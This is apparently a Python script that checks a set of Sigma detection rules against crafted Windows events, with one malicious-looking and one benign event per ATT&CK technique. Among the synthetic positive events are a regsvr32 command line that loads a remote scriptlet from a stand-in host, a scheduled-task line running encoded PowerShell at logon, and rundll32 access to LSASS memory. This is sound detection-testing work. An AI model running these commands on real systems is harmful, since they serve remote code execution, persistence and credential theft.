"""
Logical validation of the Sigma rule set (M11).

Live telemetry validation is blocked on the measurement VM (Sysmon unavailable, image-level bug), so
this validates each rule's DETECTION LOGIC against synthetic events: a crafted positive event that
models the measured atomic's behaviour (must fire) and a benign negative event (must NOT fire). This
proves the rules are logically sound and specific; it is a logic check, not a live-telemetry FP study.

A small Sigma evaluator covers the subset our rules use: field modifiers (endswith/contains/startswith/
exact), list values (OR), list-of-dict selections (OR), and boolean `condition` over selection names.

Run from repo root:  python rules/sigma_validate.py
"""
from __future__ import annotations
import glob
import os
import re
import sys

try:
    import yaml
except Exception as e:  # pragma: no cover
    print("pyyaml required:", e)
    sys.exit(2)

SIGMA_GLOB = "rules/sigma/*.yml"


# --- minimal Sigma matcher (our subset only) ----------------------------------
def _match_field(event, key, expected):
    field, _, mod = key.partition("|")
    if field not in event or event[field] is None:
        return False
    vals = event[field] if isinstance(event[field], list) else [event[field]]
    exps = expected if isinstance(expected, list) else [expected]
    for v in (str(x).lower() for x in vals):
        for e in (str(x).lower() for x in exps):
            if mod == "endswith" and v.endswith(e):
                return True
            if mod == "contains" and e in v:
                return True
            if mod == "startswith" and v.startswith(e):
                return True
            if mod == "" and v == e:
                return True
    return False


def _match_selection(event, sel):
    if isinstance(sel, list):          # list of dicts -> OR
        return any(_match_selection(event, s) for s in sel)
    return all(_match_field(event, k, v) for k, v in sel.items())


def _eval_condition(cond, sel_truth):
    expr = cond
    for name in sorted(sel_truth, key=len, reverse=True):
        expr = re.sub(r"\b" + re.escape(name) + r"\b", str(sel_truth[name]), expr)
    if not re.fullmatch(r"[\s()TrueFalsandeotno]*", expr):  # only booleans/ops remain
        raise ValueError(f"unsupported condition after substitution: {expr!r}")
    return bool(eval(expr, {"__builtins__": {}}, {}))


def rule_matches(rule: dict, event: dict) -> bool:
    detection = rule["detection"]
    cond = detection["condition"]
    truth = {name: _match_selection(event, sel)
             for name, sel in detection.items() if name != "condition"}
    return _eval_condition(cond, truth)


# --- crafted test events per rule (keyed by file stem) -------------------------
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CASES = {
    "ktld_t1082_system_information_discovery": {
        "pos": {"Image": r"C:\Windows\System32\systeminfo.exe", "ParentImage": PS},
        "neg": {"Image": r"C:\Windows\System32\notepad.exe", "ParentImage": r"C:\Windows\explorer.exe"},
    },
    "ktld_t1057_process_discovery": {
        "pos": {"Image": r"C:\Windows\System32\tasklist.exe", "ParentImage": r"C:\Windows\System32\cmd.exe"},
        "neg": {"Image": r"C:\Windows\System32\tasklist.exe", "ParentImage": r"C:\Windows\explorer.exe"},
    },
    "ktld_t1218_010_regsvr32_lolbin": {
        "pos": {"Image": r"C:\Windows\System32\regsvr32.exe",
                "CommandLine": r"regsvr32 /s /n /u /i:https://evil.test/a.sct scrobj.dll"},
        "neg": {"Image": r"C:\Windows\System32\regsvr32.exe", "CommandLine": r"regsvr32 /s legit.dll"},
    },
    "ktld_t1059_003_windows_command_shell": {
        "pos": {"Image": r"C:\Windows\System32\cmd.exe", "CommandLine": r"cmd.exe /c echo hi & whoami",
                "ParentImage": r"C:\Windows\explorer.exe"},
        "neg": {"Image": r"C:\Windows\System32\cmd.exe", "CommandLine": r"cmd.exe /c dir",
                "ParentImage": r"C:\Windows\explorer.exe"},
    },
    "ktld_t1547_001_registry_run_key": {
        "pos": {"TargetObject": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                "Details": r"C:\Users\Public\x.exe"},
        "neg": {"TargetObject": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
                "Details": r"C:\Program Files\Microsoft OneDrive\OneDrive.exe"},
    },
    "ktld_t1053_005_scheduled_task": {
        "pos": {"Image": r"C:\Windows\System32\schtasks.exe",
                "CommandLine": r"schtasks /create /tn Updater /tr powershell.exe -enc ... /sc onlogon"},
        "neg": {"Image": r"C:\Windows\System32\schtasks.exe", "CommandLine": r"schtasks /query /fo LIST"},
    },
    "ktld_t1003_001_lsass_memory_access": {
        "pos": {"TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410",
                "SourceImage": r"C:\Windows\System32\rundll32.exe"},
        "neg": {"TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410",
                "SourceImage": r"C:\Windows\System32\wininit.exe"},  # filtered: system process
    },
}


def validate_all(verbose=True):
    results = []
    for path in sorted(glob.glob(SIGMA_GLOB)):
        stem = os.path.splitext(os.path.basename(path))[0]
        rule = yaml.safe_load(open(path, encoding="utf-8"))
        case = CASES.get(stem)
        if not case:
            results.append((stem, None, None, "NO TEST CASE"))
            continue
        tp = rule_matches(rule, case["pos"])
        fp = rule_matches(rule, case["neg"])
        ok = tp and not fp
        results.append((stem, tp, fp, "OK" if ok else "FAIL"))
        if verbose:
            print(f"  [{'OK ' if ok else 'FAIL'}] {stem:48s} fires_on_positive={tp} fires_on_benign={fp}")
    return results


if __name__ == "__main__":
    print("Sigma logical validation (synthetic events):")
    res = validate_all()
    bad = [r for r in res if r[3] != "OK"]
    print(f"\n{len(res)-len(bad)}/{len(res)} rules logically valid"
          + (f"; PROBLEMS: {[r[0] for r in bad]}" if bad else " (all TP fire, no benign FP)."))
    sys.exit(1 if bad else 0)
